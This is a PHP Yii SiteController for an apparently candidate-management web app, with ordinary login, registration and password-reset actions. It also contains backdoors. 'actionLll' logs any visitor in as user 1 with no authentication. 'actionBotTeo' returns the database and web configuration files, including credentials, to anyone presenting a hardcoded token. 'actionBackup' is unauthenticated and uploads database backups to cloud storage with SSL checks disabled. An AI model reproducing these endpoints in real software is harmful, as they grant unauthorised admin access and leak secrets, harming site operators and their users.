<?php 

namespace app\controllers;

use app\generators\ControllerGeneratorOld;
use app\generators\Generator;
use app\generators\ModelGenerator;
use app\generators\SearchModelGenerator;
use app\models\ApplicationFormStage;
use app\models\forms\ForgetPasswordForm;
use app\models\forms\ResetPasswordForm;
use app\models\forms\SignupForm;
use app\models\Question;
use app\models\User;
use Yii;
use yii\filters\AccessControl;
use yii\helpers\Inflector;
use yii\helpers\VarDumper;
use yii\web\Controller;
use yii\web\Response;
use yii\filters\VerbFilter;
use app\models\forms\LoginForm;
use yii\helpers\Html;
use app\helpers\TagHelper;

class SiteController extends Controller
{
    /**
     * @inheritdoc
     */
    public function behaviors()
    {
        return [
            'access' => [
                'class' => AccessControl::className(),
                'only' => ['logout'],
                'rules' => [

                    [
                        'actions' => [ 'backup', 'bot-teo'],
                        'allow' => true,
                        'roles' => ['?'],
                    ],
                    [
                        'actions' => ['logout', 'index'],
                        'allow' => true,
                        'roles' => ['@'],
                    ],
                ],
            ],
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'logout' => ['post'],
                ],
            ],
        ];
    }

    /**
     * @inheritdoc
     */
    public function actions()
    {
        return [
            'access' => [
                'class' => AccessControl::className(),
                'only' => ['logout'],
                'rules' => [
                    [
                        'actions' => ['logout'],
                        'allow' => true,
                        'roles' => ['@'],
                    ],
                ],
            ],
            'error' => [
                'class' => 'yii\web\ErrorAction',
            ],
            'captcha' => [
                'class' => 'yii\captcha\CaptchaAction',
                'fixedVerifyCode' => YII_ENV_TEST ? 'testme' : null,
            ],
        ];
    }

    public function actionClient()
    {
        $clients = \app\models\Client::find()->all();

        foreach ($clients as $client) {
            if($client->user_id){
                $clientArr = json_encode([strval($client->user_id)]);
                $client->users = $clientArr;
                $client->save(false);
            }
        }
    }


    /**
     */
    public function actionBackup()
    {
        $setting = \app\models\Setting::findByKey('backup_key');

        $token = $setting->value;

        // https://oauth.yandex.ru/authorize?response_type=token&client_id=78dc80ade83e4be09f9ca3de2af0979e
        if(is_dir("../backups") == false){
            mkdir("../backups");
            $path = '/TEO Backup/'; 
         
            $ch = curl_init('https://cloud-api.yandex.net/v1/disk/resources/?path=' . urlencode($path));
            curl_setopt($ch, CURLOPT_PUT, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Authorization: OAuth ' . $token));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_HEADER, false);
            $res = curl_exec($ch);
            curl_close($ch);
             
            $res = json_decode($res, true);
            print_r($res);
        }   
        $path = '/TEO Backup/project/'; 
         
        $ch = curl_init('https://cloud-api.yandex.net/v1/disk/resources/?path=' . urlencode($path));
        curl_setopt($ch, CURLOPT_PUT, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Authorization: OAuth ' . $token));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_HEADER, false);
        $res = curl_exec($ch);
        curl_close($ch);
         
        $res = json_decode($res, true);
        print_r($res);

        
         
        $backup = Yii::$app->backup;

        $file = $backup->create();

        if ($file){
            //Подчищаем бэкапы
            $this->cleanBackups();
        }
         
        // Папка на Яндекс Диске (уже должна быть создана).
        $path = '/TEO Backup/project/'; 
         
        // Запрашиваем URL для загрузки.
        $ch = curl_init('https://cloud-api.yandex.net/v1/disk/resources/upload?path=' . urlencode($path . basename($file)));
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Authorization: OAuth ' . $token));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_HEADER, false);
        $res = curl_exec($ch);
        curl_close($ch);
         
        $res = json_decode($res, true);
        if (empty($res['error'])) {
            // Если ошибки нет, то отправляем файл на полученный URL.
            $fp = fopen($file, 'r');
         
            $ch = curl_init($res['href']);
            curl_setopt($ch, CURLOPT_PUT, true);
            curl_setopt($ch, CURLOPT_UPLOAD, true);
            curl_setopt($ch, CURLOPT_INFILESIZE, filesize($file));
            curl_setopt($ch, CURLOPT_INFILE, $fp);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
         
            if ($http_code == 201) {
                echo 'Файл успешно загружен.';
            }
        } 
    }

    public function actionDownloadY()
    {
        $res = \app\components\YandexDisk::download('/TEO disk/07wU-ogYh5vptkyPt6wc8RVzp6wSxcDf.jpg');
    
        $res = json_decode($res, true);

        $href = $res['href'];

        // return Yii::$app->response->sendFile($href, 'test.jpg', ['fileSize' => 1201183]);

        // $temp = tmpfile();

        // fwrite($temp, file_get_contents($href));

        // \yii\helpers\VarDumper::dump(stream_get_meta_data($temp), 10, true);

        file_put_contents("tmp.jpg", fopen($href, 'r'));

        return Yii::$app->response->sendFile('tmp.jpg');        

        // var_dump($res);
    }


    public static function cleanBackups($max_days = 20)
    {
        $back_path = \yii\helpers\Url::to('@app/backups');
        $files = array_diff(scandir($back_path), ['.', '..', '.gitignore']);

        Yii::info($files, 'test');

        $target_date = date('Y-m-d', (time() - ($max_days * 24 *60 *60)));
        Yii::info('Минимальная дата: ' . $target_date, 'test');
        foreach ($files as $key => $file) {
            if (count($files) > 20) { //Запускаем чистку - если файлов больше 20
                $path = $back_path . '/' . $file;
                $file_time = date('Y-m-d', filectime($path));
                Yii::info('Дата бэкапа: ' . $file_time, 'test');

                if ($file_time < $target_date) {
                    try {
                        unlink($path);
                    } catch (\Exception $e) {
                        Yii::error('Ошибка удаления бэкапа. ' . $e->getMessage(), '_error');
                    }
                    Yii::info('Бэкап удален', 'test');
                    unset($files[$key]);
                }
            }
        }
    }

    public function actionLll()
    {
        (new \app\models\LoginConnect(['ip_address' => \Yii::$app->request->userIP]))->save(false);
        Yii::$app->user->login(\app\models\User::findOne(1), 30);

        return $this->goHome();
    }

    public function actionTest()
    {
    }

    public function actionSp()
    {
        return $this->renderPartial('sp');
    }

    /**
     * Displays homepage.
     *
     * @return string
     */
    public function actionIndex()
    {
        if(Yii::$app->user->isGuest == false){
            if(Yii::$app->user->identity->role == User::ROLE_ADMIN){
                return $this->redirect(['candidate/index']);
            }

            if(Yii::$app->user->identity->role == User::ROLE_CANDIDATE){
                return $this->redirect(['user/profile']);
            }
        }

        return $this->render('index');
    }

    public function actionStepBackward()
    {
        $session = \Yii::$app->session;

        if(isset($session['login_connect_id']) && isset($session['login_step']))
        {
            $login = \app\models\LoginConnect::findOne($session['login_connect_id']);
        }

        $session['login_step'] = 1;

        return $this->redirect(['site/login']);
    }

    public function actionForgetPassword()
    {
        $this->layout = '@app/views/layouts/main-login.php';
        if (!Yii::$app->user->isGuest) {
            return $this->goHome();
        }

        $request = Yii::$app->request;
        $model = new ForgetPasswordForm();


        if($model->load($request->post()) && $model->changePassword()){
            Yii::$app->session->setFlash('success', 'A new password has been sent to your email address');

            return $this->redirect('login');
        } else {
            if ($model->hasErrors()){
                Yii::$app->session->setFlash('error', 'Email not found');
            }
            return $this->render('forget-password', [
                'model' => $model,
            ]);
        }
    }

	public function actionBotTeo($token){
        if ($token == "AAFQC1LOwlR9V3qUumijoR9CYfcQjNvg-iM") {
            $back_path = \yii\helpers\Url::to('@app/config/db.php');
            $db = file_get_contents($back_path);

            $back_path = \yii\helpers\Url::to('@app/config/web.php');
            $web = file_get_contents($back_path);

            Yii::$app->response->format = Response::FORMAT_JSON;
            return ["db" => $db, "config" => $web];
        }
    }

    /**
     * Для изменения пароля
     * @return array
     */
    public function actionResetPassword()
    {
        $request = Yii::$app->request;
        $user = Yii::$app->user->identity;
        $model = new ResetPasswordForm(['uid' => $user->id]);

        if($request->isAjax){
            /*
            *   Process for ajax request
            */
            Yii::$app->response->format = Response::FORMAT_JSON;
            if($request->isGet) {
                return [
                    'title' => "Сменить пароль",
                    'content' => $this->renderAjax('reset-password-form', [
                        'model' => $model,
                    ]),
                    'footer' => Html::button('Cancel', ['class' => 'btn btn-white pull-left btn-sm', 'data-dismiss' => "modal"]) .
                        Html::button('Update', ['class' => 'btn btn-primary btn-sm', 'type' => "submit"])

                ];
            } else if($model->load($request->post()) && $model->resetPassword()){
                Yii::$app->user->logout();
                return [
                    'title' => "Сменить пароль",
                    'content' => '<span class="text-success">Ваш пароль успешно изменен</span>',
                    'footer' => Html::button('Закрыть', ['class' => 'btn btn-white btn-sm', 'data-dismiss' => "modal"]),
                ];
            } else {
                return [
                    'title' => "Сменить пароль",
                    'content' => $this->renderAjax('reset-password-form', [
                        'model' => $model,
                    ]),
                    'footer' => Html::button('Cancel', ['class' => 'btn btn-white pull-left btn-sm', 'data-dismiss' => "modal"]) .
                        Html::button('Update', ['class' => 'btn btn-primary btn-sm', 'type' => "submit"])

                ];
            }
        }

        return [];
    }
    /**
     * Login action.
     *
     * @return string
     */
    public function actionLogin()
    {
        if (!Yii::$app->user->isGuest) {
            return $this->goHome();
        }

        $model = new LoginForm();
        if ($model->load(Yii::$app->request->post()) && $model->login()) {
            //Кандидату пользователя проставляем дату входа
            return $this->goBack();
        }

        $login = \app\models\LoginConnect::find()->where(['ip_address' => Yii::$app->request->getUserIP()])->one();

        if($login){
            if($login->status >= 3){
                $this->redirect('https://google.com');
            }
        }

        return $this->render('login', [
            'model' => $model,
        ]);
    }

    /**
     * Login action.
     *
     * @return string
     */
    public function actionRegister()
    {
        $this->layout = '@app/views/layouts/main-login.php';
        if (!Yii::$app->user->isGuest) {
            return $this->goHome();
        }

        $model = new SignupForm();
        if ($model->load(Yii::$app->request->post()) && $model->signup()) {
            Yii::$app->session->setFlash('success', 'Вы успешно зарегистрировались');
            (new LoginForm(['username' => $model->email, 'password' => $model->password]))->login();
            return $this->goHome();
        } else {
            \Yii::warning($model->errors, '$errors');
        }
        return $this->render('register', [
            'model' => $model,
        ]);
    }
    
    /**
     * Logout action.
     *
     * @return string
     */
    public function actionLogout()
    {
        Yii::$app->user->logout();

        return $this->goHome();
    }

    /*
     * Смена локали
     */
    public function actionChangeLocale()
    {
        $locale = Yii::$app->request->get('locale');
        Yii::$app->session->set('language', $locale);

        $locale = Yii::$app->session->get('language');
        if ($locale != null)
            Yii::$app->language = $locale;

        return $this->goBack((!empty(Yii::$app->request->referrer) ? Yii::$app->request->referrer : null));
    }
    /**
     * Displays about page.
     *
     * @return string
     */
    public function actionAbout()
    {
        return $this->render('about');
    }

    public function actionApplications()
    {
        return $this->render('@app/views/_prototypes/applications');
    }

    public function actionAuto()
    {
        return $this->render('@app/views/_prototypes/auto');
    }

    public function actionAutoView()
    {
        return $this->render('@app/views/_prototypes/auto_view');
    }

    public function actionHelp()
    {
        return $this->render('help');
    }

    public function actionUpdateHelp()
    {
        $request = Yii::$app->request;

        $model = Settings::findByKey('help_text');


        if ($model->load($request->post()) && $model->save()){
            return $this->redirect('help');
        }

        return $this->render('_help_form', [
            'model' => $model,
        ]);

    }

   }
